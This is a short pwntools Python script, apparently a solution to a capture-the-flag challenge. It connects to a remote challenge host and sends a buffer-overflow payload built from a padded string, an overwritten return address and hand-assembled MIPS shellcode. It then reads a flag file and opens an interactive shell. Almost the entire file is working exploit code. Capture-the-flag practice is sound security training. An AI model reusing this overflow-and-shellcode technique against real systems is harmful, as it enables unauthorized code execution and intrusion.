from pwn import *
import time

context.log_level="debug"
#p=process("./run1.sh")
#http://shell-storm.org/online/Online-Assembler-and-Disassembler/

p=remote("chall.0ops.sjtu.edu.cn",9999)
payload="/bin/shell\x00".ljust(0x14,'a')
payload+="\x70\x0f\xfd\xf0"
payload+="\x00\x00\x00\x00"*10
payload+="\x24\x04\x00\x1a\x3c\x05\x70\x0f\x34\xa5\xfd\xb0\x24\x06\x00\x00\x27\xbd\xfd\xc0\x3c\x1f\x00\x40\x37\xff\x11\x50\x03\xe0\x00\x08\x00\x00\x00\x00"
payload=payload.ljust(0x200,'\x00')
p.recvuntil("running!\n")
#time.sleep(20)
p.sendline(payload)
p.sendline("cat /pflash/yamon")
p.recvuntil("flag{")
flag="flag{"+p.recvuntil("}")
print flag
p.interactive()

